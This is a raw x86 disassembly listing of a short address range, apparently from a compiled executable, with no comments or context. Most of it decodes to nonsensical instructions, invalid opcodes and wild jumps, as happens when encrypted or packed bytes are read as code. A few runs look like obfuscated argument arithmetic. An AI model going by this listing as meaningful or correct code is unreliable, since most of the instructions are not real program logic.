  40208c:	out    0x4f,eax
  40208e:	add    edi,DWORD PTR [edx]
  402090:	mov    eax,ds:0x6023596a
  402095:	xchg   edi,eax
  402096:	mov    ebx,DWORD PTR [ecx+0x56a62334]
  40209c:	xchg   edx,eax
  40209d:	retf   0x1b
  4020a0:	fild   QWORD PTR [ebx+0x77a4539f]
  4020a6:	aaa    
  4020a7:	fnstenv [edi+eax*4-0x4e]
  4020ab:	or     dh,ch
  4020ad:	(bad)  
  4020ae:	neg    BYTE PTR [ecx-0x7d]
  4020b1:	shl    ch,1
  4020b3:	mov    cl,0x87
  4020b5:	in     al,dx
  4020b6:	add    BYTE PTR [ebx+0x5f],ch
  4020b9:	pop    ds
  4020ba:	scas   eax,DWORD PTR es:[edi]
  4020bb:	push   ebp
  4020bc:	ins    BYTE PTR es:[edi],dx
  4020bd:	xor    al,0x7a
  4020bf:	inc    ebp
  4020c0:	push   es
  4020c1:	int    0xc8
  4020c3:	sar    edx,0x12
  4020c6:	or     esp,ebx
  4020c8:	sbb    DWORD PTR [ebx],0x303d9ab7
  4020ce:	(bad)  
  4020cf:	cdq    
  4020d0:	gs jnp 0x402088
  4020d3:	in     al,dx
  4020d4:	pop    esp
  4020d5:	popf   
  4020d6:	in     al,0x1f
  4020d8:	popf   
  4020d9:	jg     0x402114
  4020db:	jg     0x4020fb
  4020dd:	jle    0x4020ef
  4020df:	rcl    ah,0xc8
  4020e2:	and    eax,0x8fbf09de
  4020e7:	mov    ecx,0xbcc014ea
  4020ec:	pop    ds
  4020ed:	mov    cl,0x98
  4020ef:	cdq    
  4020f0:	push   es
  4020f1:	jmp    0x4171ce5b
  4020f6:	inc    eax
  4020f7:	(bad)  
  4020f8:	sbb    eax,0x289cc35a
  4020fd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4020fe:	or     BYTE PTR [edi-0x19],ah
  402101:	vpor   ymm4,ymm4,ymm6
  402105:	pop    ebx
  402106:	loop   0x402112
  402108:	inc    edi
  402109:	pop    esi
  40210a:	lea    ecx,[edi+ebp*4-0x7]
  40210e:	mov    eax,0x768c183d
  402113:	cmp    eax,0x635900c
  402118:	aaa    
  402119:	inc    edx
  40211a:	aad    0xf2
  40211c:	push   0x1ca3d0e3
  402121:	in     al,dx
  402122:	push   cs
  402123:	call   0xcc44:0xd2b088d8
  40212a:	add    edx,DWORD PTR [edi+0x16f10ec6]
  402130:	adc    al,ah
  402132:	mov    ch,0xbb
  402134:	push   ss
  402135:	sbb    DWORD PTR [ebx-0x5740b1d2],ebx
  40213b:	push   ecx
  40213c:	and    BYTE PTR [esi+0x2],0x10
  402140:	jp     0x402102
  402142:	je     0x40212e
  402144:	out    dx,al
  402145:	pop    ss
  402146:	in     eax,dx
  402147:	xor    ch,BYTE PTR [eax+0x25cac284]
  40214d:	int3   
  40214e:	ret    
  40214f:	pop    esp
  402150:	or     ecx,DWORD PTR [ebx]
  402152:	jmp    0xc8ee:0xb32f02dc
  402159:	push   ecx
  40215a:	pop    ecx
  40215b:	or     edx,0xcfcd32b9
  402161:	mov    ebp,0x53107342
  402166:	mov    ds:0x85e31eae,al
  40216b:	or     ebp,edi
  40216d:	pop    eax
  40216e:	add    DWORD PTR [ebp+0x27],esp
  402171:	xor    eax,0xff93abde
  402176:	add    esi,eax
  402178:	lahf   
  402179:	arpl   WORD PTR [eax-0x24],bp
  40217c:	cs pop eax
  40217e:	outs   dx,BYTE PTR ds:[esi]
  40217f:	iret   
  402180:	dec    ecx
  402181:	or     al,0x22
  402183:	pusha  
  402184:	call   0xff2a:0xf38f7b5d
  40218b:	add    eax,0xe5080ffa
  402190:	adc    BYTE PTR ds:0x19d253d5,ch
  402196:	sub    DWORD PTR ds:0xfd65ec4a,0x3827024f
  4021a0:	xchg   esi,eax
  4021a1:	inc    edi
  4021a2:	cmp    BYTE PTR [eax],ah
  4021a4:	mov    bl,0x16
  4021a6:	pop    ecx
  4021a7:	popf   
  4021a8:	jp     0x4021a1
  4021aa:	lea    esi,[ecx-0x463f49af]
  4021b0:	push   eax
  4021b1:	push   ds
  4021b2:	inc    ebp
  4021b3:	fsubr  DWORD PTR [eax]
  4021b5:	shr    DWORD PTR [edi],1
  4021b7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4021b8:	gs sub al,cl
  4021bb:	out    dx,al
  4021bc:	aad    0x35
  4021be:	dec    edi
  4021bf:	pop    eax
  4021c0:	pop    esp
  4021c1:	mov    BYTE PTR [ebx+0x21754778],bl
  4021c7:	dec    esp
  4021c8:	popa   
  4021c9:	addr16 mov eax,0x46e05e46
  4021cf:	and    dl,BYTE PTR [ecx-0x6e]
  4021d2:	inc    ebp
  4021d3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4021d4:	add    bh,ch
  4021d6:	add    esp,DWORD PTR [esp+ebx*8-0x6a]
  4021da:	dec    edi
  4021db:	cmp    ah,BYTE PTR [ecx]
  4021dd:	call   0x4e76:0x7d2fcbe9
  4021e4:	xor    cl,BYTE PTR [ebx-0x4771fd08]
  4021ea:	into   
  4021eb:	mov    ds:0xa7e8ce0d,al
  4021f0:	jns    0x40217c
  4021f2:	push   es
  4021f3:	pop    eax
  4021f4:	pop    edi
  4021f5:	xor    dh,ah
  4021f7:	adc    al,0x96
  4021f9:	jb     0x402214
  4021fb:	sahf   
  4021fc:	pop    esp
  4021fd:	repz (bad) 
  4021ff:	aad    0xca
  402201:	sbb    DWORD PTR [esi-0xa],0x3d
  402205:	(bad)  
  402206:	retf   0x2984
  402209:	xchg   ebx,eax
  40220a:	push   esi
  40220b:	dec    esi
  40220c:	call   0x939ded13
  402211:	push   esp
  402212:	and    al,0x18
  402214:	sbb    al,ch
  402216:	div    BYTE PTR [ecx+0x21e48881]
  40221c:	jns    0x40227b
  40221e:	add    eax,0xf9a8ad70
  402223:	cs popf 
  402225:	ret    
  402226:	inc    ebx
  402227:	js     0x402218
  402229:	pop    eax
  40222a:	pushf  
  40222b:	js     0x40221d
  40222d:	sub    al,0x7d
  40222f:	fild   WORD PTR [esp+ecx*8+0x78]
  402233:	jnp    0x4021c5
  402235:	call   0x6e80:0x2fb6f20a
  40223c:	fsubr  DWORD PTR [edx+0x1911ac61]
  402242:	repz out 0x97,al
  402245:	and    eax,0xe98ddf79
  40224a:	out    dx,eax
  40224b:	gs pop ecx
  40224d:	dec    esi
  40224e:	lahf   
  40224f:	shl    esi,1
  402251:	dec    esp
  402252:	(bad)  
  402253:	jmp    0x4526cd16
  402258:	inc    edx
  402259:	mov    ds:0xb53be7c2,al
  40225e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40225f:	jp     0x4021fe
  402261:	cmp    BYTE PTR [eax],al
  402263:	and    BYTE PTR [edi-0x27cc25db],cl
  402269:	dec    ebp
  40226a:	or     ch,BYTE PTR [edx-0xf2ca63a]
  402270:	clc    
  402271:	or     bh,BYTE PTR [eax]
  402273:	ins    DWORD PTR es:[edi],dx
  402274:	add    ebp,DWORD PTR [ecx+0x6cb286e9]
  40227a:	fsub   DWORD PTR ss:[ebp-0x6f092976]
  402281:	out    dx,al
  402282:	xchg   ch,cl
  402284:	adc    esp,DWORD PTR [edi+0x3c]
  402287:	or     al,0x4d
  402289:	sub    eax,0x7f44415b
  40228e:	or     DWORD PTR [edi+0x1d],esi
  402291:	mov    al,ds:0x732ba890
  402296:	ret    0xbb0f
  402299:	xchg   edx,eax
  40229a:	imul   esp,DWORD PTR [ecx-0x21],0xb2375ead
  4022a1:	fcom   st(0)
  4022a3:	and    ch,BYTE PTR [edx+0x2581c633]
  4022a9:	jno    0x402252
  4022ab:	inc    edx
  4022ac:	add    BYTE PTR [ebp+0x30042a7],dh
  4022b2:	(bad)  
  4022b3:	cmp    DWORD PTR [ecx],eax
  4022b5:	jne    0x402dc8
  4022bb:	mov    eax,DWORD PTR [ebp+0x8]
  4022be:	mov    ecx,DWORD PTR [ebp-0x18]
  4022c1:	sbb    DWORD PTR ds:0x42a835,0x2700
  4022cb:	xor    eax,esi
  4022cd:	add    eax,edi
  4022cf:	jmp    0x40256e
  4022d4:	xlat   BYTE PTR ds:[ebx]
  4022d5:	cmp    eax,0xd9d5d1c7
  4022da:	fxch   st(1)
  4022dc:	mov    edi,0xe8682c5b
  4022e1:	xor    DWORD PTR [esi+0x12],edx
  4022e4:	add    al,0x9
  4022e6:	js     0x402360
  4022e8:	(bad)  
  4022e9:	jle    0x402363
  4022eb:	js     0x4022d9
  4022ed:	cmc    
  4022ee:	jmp    edi
  4022f0:	retf   0xbdfa
  4022f3:	mov    esi,DWORD PTR ds:0xb1148f4a
  4022f9:	aas    
  4022fa:	xor    ecx,DWORD PTR fs:[edi]
  4022fd:	dec    esi
  4022fe:	jns    0x40237c
  402300:	and    eax,0x4eb1415d
  402305:	mov    WORD PTR [edi+esi*8+0x58818d4d],?
  40230c:	test   BYTE PTR [esp+edi*4],cl
  40230f:	jmp    0x4022b6
  402311:	sti    
  402312:	(bad)  
  402313:	mov    cl,0xaa
  402315:	fld    TBYTE PTR [ecx+0x36]
  402318:	add    BYTE PTR [eax+0x60fff261],ah
  40231e:	sbb    DWORD PTR [edx+0x55],ecx
  402321:	mov    bl,al
  402323:	mov    al,0x4b
  402325:	ds scas ax,WORD PTR es:[edi]
  402328:	repz xor al,0xdf
  40232b:	jmp    0xe2883ce0
  402330:	fistp  WORD PTR [esi-0x37]
  402333:	push   0xffffffed
  402335:	addr16 xchg ecx,eax
  402337:	ds jb  0x402368
  40233a:	aam    0x6a
  40233c:	push   esp
  40233d:	cwde   
  40233e:	idiv   BYTE PTR [edx]
  402340:	xchg   edx,eax
  402342:	mov    esi,0x4ce874e8
  402347:	mov    bh,0x3a
  402349:	xchg   edi,eax
  40234a:	xlat   BYTE PTR ds:[ebx]
  40234b:	mov    WORD PTR [edi],?
  40234d:	(bad)  
  40234f:	sub    DWORD PTR [eax-0x3d],ebp
  402352:	or     DWORD PTR [eax],esp
  402354:	xchg   ebx,eax
  402355:	cs mov ah,0xd4
  402358:	dec    esi
  402359:	sti    
  40235a:	stc    
  40235b:	dec    esi
  40235c:	inc    eax
  40235d:	jecxz  0x402378
  40235f:	push   ebp
  402360:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402361:	push   ss
  402362:	cmp    ebp,ebx
  402364:	adc    DWORD PTR [edi-0x18],edi
  402367:	call   0xf44f:0x62c983a5
  40236e:	mov    ebx,0x7c09ea33
  402373:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402374:	adc    al,0xc0
  402376:	cdq    
  402377:	dec    eax
  402378:	fst    DWORD PTR [eax]
  40237a:	mov    WORD PTR [esi],es
  40237c:	pushf  
  40237d:	add    ah,BYTE PTR [edi+0x44]
  402380:	loopne 0x402393
  402382:	pop    ebx
  402383:	mov    eax,0xa4809bcd
  402388:	mov    bh,cl
  40238a:	fndisi(8087 only) 
  40238c:	mov    edx,0x7da3c1c6
  402391:	jge    0x4023c5
  402393:	xchg   ebp,eax
  402394:	loop   0x402362
  402396:	pop    esi
  402397:	mov    cl,BYTE PTR [edi+0x43]
  40239a:	sub    ch,BYTE PTR [edx]
  40239c:	pop    ebx
  40239d:	shr    BYTE PTR [esi],cl
  40239f:	xor    BYTE PTR ds:0x25a73b63,0x8c
  4023a6:	fucomi st,st(3)
  4023a8:	iret   
  4023a9:	adc    DWORD PTR [edx],edi
  4023ab:	inc    edx
  4023ac:	mov    WORD PTR [esi+edi*4],es
  4023af:	jle    0x402396
  4023b1:	aad    0xcb
  4023b3:	rol    dh,1
  4023b5:	ret    
  4023b6:	imul   ebx,DWORD PTR [eax+eax*4],0x5d
  4023ba:	imul   esi,DWORD PTR [eax],0xdadb3113
  4023c0:	out    dx,eax
  4023c1:	fiadd  DWORD PTR [eax]
  4023c3:	xchg   ebx,eax
  4023c4:	ss mov ebp,esi
  4023c7:	pop    ss
  4023c8:	data16 add al,0x45
  4023cb:	push   0xffffffaa
  4023cd:	jmp    0x4023e4
  4023cf:	jne    0x40235a
  4023d1:	jg     0x402353
  4023d3:	jnp    0x402442
  4023d5:	imul   edx,DWORD PTR [edx+0x15],0xfffffff5
  4023d9:	pop    edx
  4023da:	xor    DWORD PTR [ebp-0x2836b09],edx
  4023e0:	inc    ebx
  4023e1:	pop    edi
  4023e2:	sub    BYTE PTR [edi-0x4ca241d9],bl
  4023e8:	push   cs
  4023e9:	fiadd  DWORD PTR [eax]
  4023eb:	adc    BYTE PTR [eax],0x6d
  4023ee:	push   DWORD PTR [ecx-0x4e9d429b]
  4023f4:	pop    ebp
  4023f5:	sbb    ch,BYTE PTR ds:0x4943aecc
  4023fb:	neg    BYTE PTR [ebx+0x58]
  4023fe:	out    0x1c,eax
  402400:	in     eax,dx
  402401:	das    
  402402:	add    edi,DWORD PTR [edi-0x75503fdb]
  402408:	push   esi
  402409:	jb     0x40242a
  40240b:	scas   eax,DWORD PTR es:[edi]
  40240c:	sub    dl,al
  40240e:	out    dx,al
  40240f:	pop    esi
  402410:	les    eax,FWORD PTR [edx+0x2]
  402413:	or     BYTE PTR [ebx*4+0x3438d36e],cl
  40241a:	les    edx,FWORD PTR ds:0x9ee2a518
  402420:	nop
  402421:	mov    BYTE PTR ds:0xaf95eb2e,bh
  402427:	push   edi
  402428:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402429:	mov    esp,0xe0123a79
  40242e:	mov    ds:0x4237e65a,al
  402433:	test   BYTE PTR [eax],0x38
  402436:	push   cs
  402437:	push   edx
  402438:	pop    ss
  402439:	(bad)  
  40243a:	pop    edi
  40243b:	inc    ebp
  40243c:	pop    edi
  40243d:	jne    0x402437
  40243f:	mov    al,ds:0x692f03b3
  402444:	dec    esp
  402445:	mov    ah,0xf1
  402447:	pop    esp
  402448:	shr    BYTE PTR [esi-0x79],cl
  40244b:	inc    ecx
  40244c:	sub    dl,BYTE PTR [ecx-0xa59d4aa]
  402452:	imul   eax,edx,0x19
  402455:	lock adc ecx,esp
  402458:	mov    ds:0x6c52bd47,al
  40245d:	xor    al,0x3b
  40245f:	in     eax,dx
  402460:	pop    edi
  402461:	push   0x4d
  402463:	loope  0x402419
  402465:	jge    0x4024ad
  402467:	inc    esp
  402468:	pop    ebp
  402469:	ins    DWORD PTR es:[edi],dx
  40246a:	popf   
  40246b:	fwait
  40246c:	retf   0x53d9
  40246f:	int    0x2a
  402471:	loopne 0x402472
  402473:	push   es
  402474:	aad    0x58
  402476:	outs   dx,DWORD PTR ds:[esi]
  402477:	xor    al,0xc8
  402479:	mov    dl,0x38
  40247b:	fldenv [edx+0x1d09858]
  402481:	xor    esi,DWORD PTR [ebp-0x62d97103]
  402487:	repnz test al,0xa8
  40248a:	retf   0xf7e0
  40248d:	enter  0x4c9,0xe3
  402491:	(bad)  
  402492:	in     al,dx
  402493:	add    BYTE PTR [esi-0x42],0x91
  402497:	xchg   ecx,eax
  402498:	(bad)  
  402499:	mov    edx,0x3fd86fdd
  40249e:	adc    eax,0xaad45308
  4024a3:	jmp    0x944262e1
  4024a8:	xchg   edi,eax
  4024a9:	inc    ebx
  4024aa:	ror    BYTE PTR [edi],cl
  4024ac:	xchg   esp,eax
  4024ad:	enter  0x346e,0x59
  4024b1:	and    BYTE PTR [eax-0x103d4868],bh
  4024b7:	stos   DWORD PTR es:[edi],eax
  4024b8:	mov    cl,0xf0
  4024ba:	arpl   sp,si
  4024bc:	or     DWORD PTR ds:0xfb50fe8c,eax
  4024c2:	pop    es
  4024c3:	ins    BYTE PTR es:[edi],dx
  4024c4:	xor    BYTE PTR [eax-0x3274b713],bh
  4024ca:	cli    
  4024cb:	push   ss
  4024cc:	dec    esp
  4024ce:	out    dx,al
  4024cf:	or     ah,BYTE PTR [ecx+0x62]
  4024d2:	in     eax,dx
  4024d3:	cs jp  0x4024bd
  4024d6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4024d7:	xor    DWORD PTR [ecx+0x5738bc7c],esp
  4024dd:	mov    edi,DWORD PTR [edi-0x5a68e5dc]
  4024e3:	dec    DWORD PTR [ebp-0x37be9ba3]
  4024e9:	cwde   
  4024ea:	sahf   
  4024eb:	loop   0x402554
  4024ed:	scas   eax,DWORD PTR es:[edi]
  4024ee:	xchg   ebp,eax
  4024ef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4024f0:	mov    ds:0xfcb22432,al
  4024f5:	ja     0x402480
  4024f7:	in     eax,dx
  4024f8:	xor    DWORD PTR [ebp-0x6856251],ecx
  4024fe:	pop    esi
  4024ff:	dec    edi
  402500:	jp     0x4024ef
  402502:	xor    BYTE PTR ds:0x78747c76,ah
  402508:	mov    esp,DWORD PTR [ebp+0x715c5875]
  40250e:	les    eax,FWORD PTR [ebx+ecx*2]
  402511:	aad    0xdd
  402513:	jp     0x40258c
  402515:	xor    eax,0x6bcd6549
  40251a:	jns    0x4024ab
  40251c:	std    
  40251d:	fimul  WORD PTR cs:[edi-0x3f09e759]
  402524:	sub    ah,BYTE PTR [ecx+0x2e8f82c3]
  40252a:	ins    BYTE PTR es:[edi],dx
  40252b:	(bad)  
  40252c:	sti    
  40252d:	ins    BYTE PTR es:[edi],dx
  40252e:	sbb    DWORD PTR [ecx-0x46a34abe],esi
  402534:	gs xor dh,dl
  402537:	nop
  402538:	leave  
  402539:	push   ds
  40253a:	fsubr  QWORD PTR ds:0x94b251cf
  402540:	into   
  402541:	mov    al,ds:0xc6873d5c
  402546:	add    al,0x77
  402548:	jnp    0x913960f4
  40254e:	shl    DWORD PTR [eax],cl
  402550:	lea    ebp,[ebp-0x637a20d]
  402556:	mov    ebx,0xec9c3ea2
  40255b:	mov    ch,0xcd
  40255d:	pushf  
  40255e:	or     esp,DWORD PTR [edi-0x28]
  402561:	add    ebp,ecx
  402563:	mov    ebx,0xe64ad78a
  402568:	ret    0x3720
  40256b:	fs mov ebx,0xf013975
  402571:	test   DWORD PTR [edx+eax*1+0x458b0000],edi
  402578:	or     BYTE PTR [ebx-0x39cc0fb3],cl
  40257e:	add    eax,edi
  402580:	mov    DWORD PTR [ecx],eax
  402582:	jmp    0x402821
  402587:	aas    
  402588:	retf   
  402589:	ret    0xcace
  40258c:	aad    0xd3
  40258e:	fld    DWORD PTR [ecx+eiz*1+0x26]
  402592:	inc    edx
  402593:	call   0x8afe9c6c
  402598:	vmread DWORD PTR [eax-0x2],edi
  40259c:	jle    0x402616
  40259e:	js     0x402546
  4025a0:	cwde   
  4025a1:	in     eax,0xab
  4025a3:	call   0xab82385
  4025a8:	loop   0x40261a
  4025aa:	sbb    ch,BYTE PTR [ebx+esi*1+0x7]
  4025ae:	pop    edx
  4025af:	lock in eax,dx
  4025b1:	dec    ebp
  4025b2:	(bad)  
  4025b3:	and    edx,eax
  4025b5:	inc    ebp
  4025b6:	push   eax
  4025b7:	in     eax,0x46
  4025b9:	cs in  eax,dx
  4025bb:	clc    
  4025bc:	ss dec ecx
  4025be:	xor    al,BYTE PTR [ebx+eiz*1-0x2c]
  4025c2:	inc    esp
  4025c3:	add    eax,esi
  4025c5:	(bad)
  4025c8:	ret    
  4025c9:	ret    
  4025ca:	(bad)  
  4025cb:	sub    ecx,esi
  4025cd:	out    dx,eax
  4025ce:	lock fs clc 
  4025d1:	jge    0x402617
  4025d3:	stos   BYTE PTR es:[edi],al
  4025d4:	cwde   
  4025d5:	ins    DWORD PTR es:[edi],dx
  4025d6:	push   DWORD PTR [edx]
  4025d8:	cmp    eax,0x502b6c1a
  4025dd:	retf   0x40a4
  4025e0:	xchg   esp,eax
  4025e1:	call   0xc211:0x69b2c8ba
  4025e8:	jg     0x4025a9
  4025ea:	xchg   ebp,eax
  4025eb:	test   al,bl
  4025ed:	lds    ecx,FWORD PTR [esi]
  4025ef:	bnd ja 0x402660
  4025f2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4025f3:	hlt    
  4025f4:	pop    ebx
  4025f5:	or     BYTE PTR [eax],0xed
  4025f8:	mov    ds:0x8f0f9c63,eax
  4025fd:	xchg   BYTE PTR [ebp+0x4ced60e9],al
  402603:	sbb    dl,dh
  402605:	movq   mm1,QWORD PTR [edx-0x5e]
  402609:	cmp    cl,BYTE PTR [edi]
  40260b:	sbb    al,0xcd
  40260d:	mov    ds:0xea0e567a,eax
  402612:	sub    BYTE PTR [edx+0x24],bl
  402615:	xchg   BYTE PTR [esi+0x1a89357c],dh
  40261b:	inc    edx
  40261c:	clc    
  40261d:	shr    BYTE PTR [ebx],1
  40261f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402620:	inc    eax
  402621:	cdq    
  402622:	xchg   DWORD PTR [ecx],edi
  402624:	into   
  402625:	shr    DWORD PTR [ebp+0x4f],1
  402628:	sub    bl,0xa5
  40262b:	cmp    al,0x8b
  40262d:	mov    ecx,0x7a535509
  402632:	xor    BYTE PTR [ebp-0x7f],al
  402635:	sub    al,0x2f
  402637:	call   0x3032:0xf52d8538
  40263e:	jl     0x402649
  402640:	jbe    0x402665
  402642:	mov    dh,0x3
  402644:	jo     0x402692
  402646:	out    dx,eax
  402647:	mov    edx,0x54f1d41
  40264c:	dec    ecx
  40264d:	call   0x34fb:0xa87cc214
  402654:	xor    esp,edi
  402656:	scas   eax,DWORD PTR es:[edi]
  402657:	rol    ebx,cl
  402659:	pop    es
  40265a:	adc    ch,ah
  40265c:	fucom  st(1)
  40265e:	push   0x6ff32a4e
  402663:	and    al,BYTE PTR [eax-0x604b2c5a]
  402669:	lods   al,BYTE PTR ds:[esi]
  40266a:	push   0x3c
  40266c:	cdq    
  40266d:	cmp    ebx,DWORD PTR [esi-0x54]
  402670:	sbb    dl,al
  402672:	cmp    ecx,DWORD PTR [ecx-0x1a]
  402675:	fcomp  DWORD PTR [ebx-0x65]
  402678:	cmp    BYTE PTR [ecx],ah
  40267a:	je     0x402659
  40267c:	mov    edx,0xc2321f52
  402681:	push   eax
  402682:	(bad)  
  402683:	cli    
  402684:	setae  BYTE PTR [ebp-0x4a]
  402688:	xor    BYTE PTR [edx],dl
  40268a:	pusha  
  40268b:	cwde   
  40268c:	lods   eax,DWORD PTR ds:[esi]
  40268d:	sub    al,ch
  40268f:	lds    edi,FWORD PTR [ebx-0x627afc97]
  402695:	mov    esp,0xf502f322
  40269a:	iret   
  40269b:	les    edi,FWORD PTR [eax-0x2e]
  40269e:	mov    al,0x2e
  4026a0:	mov    ebx,0x38f1b779
  4026a5:	add    BYTE PTR [ebx+ebp*2],ch
  4026a8:	addr16 aaa 
  4026aa:	xor    DWORD PTR [esi+0x29],ebx
  4026ad:	int3   
  4026ae:	mov    ah,0x33
  4026b0:	jmp    0x512:0xe9bdd96d
  4026b7:	test   al,0x81
  4026b9:	nop
  4026ba:	out    dx,al
  4026bb:	add    ah,dh
  4026bd:	inc    eax
  4026be:	sub    eax,0x5a66b98b
  4026c3:	cmp    ecx,DWORD PTR [ebx-0x62a15e0e]
  4026c9:	xchg   ebx,eax
  4026ca:	pushf  
  4026cb:	mov    ebx,0x80a15089
  4026d0:	daa    
  4026d1:	cmp    eax,0xf1b357b9
  4026d6:	cmp    ebx,ebx
  4026d8:	mov    bl,BYTE PTR [edi-0x3061ed20]
  4026de:	das    
  4026df:	xchg   DWORD PTR [esi],ebx
  4026e1:	jno    0x40266a
  4026e3:	(bad)  
  4026e4:	xor    ch,BYTE PTR [ecx-0x6f]
  4026e7:	sar    BYTE PTR [edi-0x11],0xe3
  4026eb:	aad    0x69
  4026ed:	aad    0xe3
  4026ef:	or     bl,BYTE PTR [edx]
  4026f1:	xor    eax,0xd44ea3ca
  4026f6:	inc    edi
  4026f7:	ret    0xff5b
  4026fa:	and    al,BYTE PTR [ebp-0x40]
  4026fd:	loope  0x402686
  4026ff:	cmp    DWORD PTR [ebp-0x6bc1e49e],0xffffff87
  402706:	sub    eax,0x97fb5423
  40270b:	xor    esp,DWORD PTR [esi+0x1618a41c]
  402711:	lock mov dh,0x1
  402714:	sub    al,0x63
  402716:	mov    bl,0xa
  402718:	retf   
  402719:	(bad)  [esi]
  40271b:	push   ss
  40271c:	and    DWORD PTR [edx],ebp
  40271e:	inc    ebp
  40271f:	sar    ch,0x87
  402722:	adc    DWORD PTR [esi-0x38ebd868],0x27982fa5
  40272c:	jg     0x402713
  40272e:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  402730:	mov    edx,DWORD PTR [edi-0x3d]
  402733:	clc    
  402734:	mov    edx,0xf1ce857f
  402739:	mov    WORD PTR ss:[ecx-0xb],fs
  40273d:	ins    BYTE PTR es:[edi],dx
  40273e:	xchg   edx,eax
  40273f:	into   
  402740:	out    dx,al
  402741:	inc    eax
  402742:	popf   
  402743:	mov    BYTE PTR [ebx-0x45],dh
  402746:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402747:	mov    al,0xa7
  402749:	sub    al,0x37
  40274b:	aas    
  40274c:	dec    edx
  40274d:	inc    eax
  40274e:	cdq    
  40274f:	cld    
  402750:	sbb    cl,dl
  402752:	jnp    0x4027b9
  402754:	dec    ebx
  402755:	push   0x96d86ef9
  40275a:	adc    esp,ebx
  40275c:	sbb    ebp,ebp
  40275e:	mov    WORD PTR [esi],es
  402760:	int3   
  402761:	ror    DWORD PTR [esi+0x4f],cl
  402764:	mov    fs,WORD PTR [ecx]
  402766:	lea    edi,[esi-0x7844f725]
  40276c:	pusha  
  40276d:	fimul  WORD PTR ds:0x1564f16f
  402773:	xor    DWORD PTR [esi+0x31],edx
  402776:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402777:	frstor [ecx+0x72]
  40277a:	sub    al,0xab
  40277c:	fldcw  WORD PTR [esi+eiz*2-0x204bb933]
  402783:	mov    dl,0x7d
  402785:	sub    ah,BYTE PTR [eax-0x51]
  402788:	xchg   edi,eax
  402789:	mov    bl,0xbc
  40278b:	xor    DWORD PTR [edx],esp
  40278d:	popf   
  40278e:	loopne 0x4027ad
  402790:	ds repnz stos BYTE PTR es:[edi],al
  402793:	mov    eax,DWORD PTR [edx]
  402795:	loop   0x4027d6
  402797:	les    ebx,FWORD PTR [ebp-0x4434943a]
  40279d:	xchg   ecx,eax
  40279e:	cwde   
  40279f:	jo     0x402780
  4027a1:	push   es
  4027a2:	pop    esi
  4027a3:	ins    BYTE PTR es:[edi],dx
  4027a4:	repz sbb cl,ch
  4027a7:	leave  
  4027a8:	(bad)  
  4027aa:	push   DWORD PTR [ebp+0x3d]
  4027ad:	cli    
  4027ae:	mov    bh,0x4f
  4027b0:	mov    dl,0x6b
  4027b2:	push   ds
  4027b3:	int    0xa7
  4027b5:	dec    edx
  4027b6:	jmp    0x40278b
  4027b8:	mov    dh,BYTE PTR [eax-0x653751e1]
  4027be:	int    0x42
  4027c0:	xchg   BYTE PTR [edx],dh
  4027c2:	push   ecx
  4027c3:	shr    esp,cl
  4027c5:	rol    BYTE PTR [eax+eax*2],cl
  4027c8:	mov    dl,0x26
  4027ca:	mov    bh,0x1c
  4027cc:	jns    0x4027e0
  4027ce:	data16 sti 
  4027d0:	retf   
  4027d1:	inc    ebp
  4027d2:	pop    esi
  4027d3:	cmp    BYTE PTR [ecx],0x99
  4027d6:	add    cl,ah
  4027d8:	sub    BYTE PTR [eax],al
  4027da:	aaa    
  4027db:	cmp    edi,DWORD PTR [edx+0xe2772ba]
  4027e1:	sub    bh,BYTE PTR [ecx-0x16]
  4027e4:	jge    0x4027c3
  4027e6:	call   FWORD PTR [edi-0x61]
  4027e9:	int    0xaa
  4027eb:	pushf  
  4027ec:	jne    0x40285d
  4027ee:	jecxz  0x40284c
  4027f0:	xor    esi,edi
  4027f2:	inc    eax
  4027f3:	jmp    0x402822
  4027f5:	xchg   esp,eax
  4027f6:	sub    ah,dh
  4027f8:	push   edx
  4027f9:	xor    eax,0xee5a9446
  4027fe:	out    dx,al
  4027ff:	inc    esp
  402800:	jmp    0x1eb0:0x918028e5
  402807:	xchg   esp,eax
  402808:	aas    
  402809:	jle    0x4027e9
  40280b:	xchg   esi,eax
  40280c:	aaa    
  40280d:	(bad)  
  40280f:	xor    edi,DWORD PTR [ebx]
  402811:	adc    cl,al
  402813:	sbb    eax,0xd95a6617
  402818:	shl    BYTE PTR [esi],cl
  40281a:	adc    DWORD PTR [ecx+0x71],esp
  40281d:	sub    ebp,ecx
  40281f:	pop    ebp
  402820:	mov    eax,ds:0x8bf0458b
  402825:	dec    ebp
  402826:	adc    BYTE PTR [ebx],dh
  402828:	into   
  402829:	mov    edx,0xffcd8d68
  40282e:	sub    edx,ecx
  402830:	add    DWORD PTR [eax],edx
  402832:	mov    eax,ds:0x41ebba
  402837:	mov    eax,DWORD PTR [eax]
  402839:	mov    cx,WORD PTR [ebp-0x4]
  40283d:	movzx  ecx,cx
  402840:	add    ecx,DWORD PTR [eax]
  402842:	mov    DWORD PTR [ebp-0x18],ecx
  402845:	mov    eax,DWORD PTR [ebp+0xc]
  402848:	mov    ecx,DWORD PTR [ebp+0xc]
  40284b:	xor    eax,esi
  40284d:	lea    eax,[eax+eax*1+0x327298]
  402854:	xor    ecx,esi
  402856:	sub    ecx,eax
  402858:	mov    ax,WORD PTR [ebp-0x4]
  40285c:	movzx  eax,ax
  40285f:	cmp    eax,ecx
  402861:	mov    eax,DWORD PTR [ebp+0x10]
  402864:	movzx  ecx,WORD PTR [ebp-0x4]
  402868:	jg     0x402dbb
  40286e:	xor    eax,esi
  402870:	jmp    0x402b0f
  402875:	ret    
  402876:	ror    ecx,cl
  402878:	into   
  402879:	(bad)  
  40287b:	fcmovnbe st,st(1)
  40287d:	out    0x1c,eax
  40287f:	dec    esp
  402880:	stos   BYTE PTR es:[edi],al
  402881:	retf   0xc9e4
  402884:	push   edi
